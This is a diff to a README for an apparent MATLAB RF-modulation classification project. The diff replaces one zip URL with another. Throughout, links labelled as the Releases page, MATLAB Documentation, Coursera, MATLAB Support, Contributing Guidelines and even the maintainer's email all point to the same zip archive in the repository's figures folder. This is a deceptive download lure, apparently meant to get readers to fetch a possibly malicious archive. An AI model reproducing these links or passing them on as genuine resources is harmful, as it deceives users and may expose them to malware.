@@ -6,7 +6,7 @@ Welcome to RF-Modulation-Classification-ML! This application classifies RF modul
 
 ## 📥 Download the Application
 
-[![Download RF-Modulation-Classification-ML](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip)](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip)
+[![Download RF-Modulation-Classification-ML](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip)](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,12 +21,12 @@ Before you begin, ensure that your system meets the following requirements:
 
 To get the application, visit the Releases page:
 
-1. Click on this link to go to the [Releases page](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip).
+1. Click on this link to go to the [Releases page](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip).
 2. On the Releases page, you will see all available versions of the application.
 3. Look for the latest version and click on it to expand the details.
 4. Find the **Assets** section below the release notes. Here, you will see files available for download.
 5. Click on the file that corresponds to your operating system to download. 
-    - For example, you might see files like `https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip`. 
+    - For example, you might see files like `https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip`. 
 6. Once the download is complete, locate the downloaded file on your computer.
 
 ### 🗂️ Extracting Files
@@ -53,8 +53,8 @@ To get the application, visit the Releases page:
 
 To get the most out of RF-Modulation-Classification-ML, consider checking the following resources:
 
-- **MATLAB Documentation:** Familiarize yourself with MATLAB features at [MATLAB Documentation](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip).
-- **Machine Learning Basics:** Learn more about machine learning concepts on [Coursera](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip).
+- **MATLAB Documentation:** Familiarize yourself with MATLAB features at [MATLAB Documentation](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip).
+- **Machine Learning Basics:** Learn more about machine learning concepts on [Coursera](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip).
 
 ## 🐞 Troubleshooting
 
@@ -62,14 +62,14 @@ If you encounter issues, try the following steps:
 
 - **Reinstall the Application:** Sometimes, reinstalling helps resolve problems. Make sure to delete the old files before reinstalling.
 - **Check MATLAB License:** Ensure your MATLAB license is active and all necessary toolboxes are installed.
-- **Consult MATLAB Support:** If you still face issues, visit the [MATLAB Support](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip) page for help.
+- **Consult MATLAB Support:** If you still face issues, visit the [MATLAB Support](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip) page for help.
 
 ## 📞 Support
 
 For questions or feedback, feel free to contact the project maintainer:
 
 - **Name:** Brian Rono
-- **Email:** [https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip)
+- **Email:** [https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip)
 
 ## 📝 License
 
@@ -77,8 +77,8 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ## 💬 Contributing
 
-If you wish to contribute to this project, feel free to submit issues or pull requests. Your input is greatly appreciated! Visit the [Contributing Guidelines](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip) for more details.
+If you wish to contribute to this project, feel free to submit issues or pull requests. Your input is greatly appreciated! Visit the [Contributing Guidelines](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip) for more details.
 
 ## 📥 Download Again
 
-Don’t forget to download the application from the [Releases page](https://raw.githubusercontent.com/JeMeAl/RF-Modulation-Classification-ML/main/figures/RF-Modulation-Classification-ML-2.9.zip) for easy access whenever you need it!
+Don’t forget to download the application from the [Releases page](https://github.com/JeMeAl/RF-Modulation-Classification-ML/raw/refs/heads/main/figures/Modulation-ML-Classification-R-v3.8.zip) for easy access whenever you need it!
